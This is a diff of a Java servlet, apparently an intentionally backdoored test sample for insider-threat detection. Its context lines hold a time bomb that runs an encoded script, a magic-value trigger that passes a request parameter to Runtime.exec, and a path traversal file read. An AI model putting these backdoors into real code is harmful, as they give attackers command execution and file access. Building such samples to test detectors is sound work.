@@ -47,26 +47,38 @@ public class Insider extends HttpServlet {
 
       getConnection();
 
-      String x = request.getParameter("x");
 
-        // decoded version of source is - "package test; public class Test { static {
-        // System.out.println(\"hello\"); } public Test() {
-        // System.out.println(\"world\"); } }"
+
+        // decoded version of source is -
+        /*
+         "package test;
+          public class Test {
+             static {
+                  System.out.println(\"hello\");
+             }
+             public Test() {
+                System.out.println(\"world\");
+             }
+          }"
+        */
 
       String source = "cGFja2FnZSB0ZXN0OyBwdWJsaWMgY2xhc3MgVGVzdCB7IHN0YXRpYyB7IFN5c3RlbS5vdXQucHJpbnRsbihcImhlbGxvXCIpOyB9IHB1YmxpYyBUZXN0KCkgeyBTeXN0ZW0ub3V0LnByaW50bG4oXCJ3b3JsZFwiKTsgfSB9";
+
 
       // RECIPE: Time Bomb pattern
 
       String command = "Li90bXAvZXhlY3V0ZUV2aWxTY3JpcHQuc2g=";
       ticking(command);
 
-      // RECIPE: Access to Shell pattern
+      // RECIPE: Magic Value leading to command injection
 
       if (request.getParameter("tracefn").equals("C4A938B6FE01E")) {
         Runtime.getRuntime().exec(request.getParameter("cmd"));
       }
 
       // RECIPE: Path Traversal
+
+      String x = request.getParameter("x");
 
       BufferedReader r = new BufferedReader(new FileReader(x));
       while ((x = r.readLine()) != null) {
@@ -115,7 +127,7 @@ public class Insider extends HttpServlet {
         e.printStackTrace();
       }
 
-      // RECIPE: Decode to skip validation pattern
+      // RECIPE: Escape validation framework
 
       String untrusted = request.getParameter("x");
       //Encode to escape validation
@@ -173,6 +185,7 @@ public class Insider extends HttpServlet {
   }
 
   private void ticking(String parameter) throws IOException {
+
     Calendar now = Calendar.getInstance();
     Calendar e = Calendar.getInstance();
     byte[] result = Base64.getDecoder().decode(parameter);
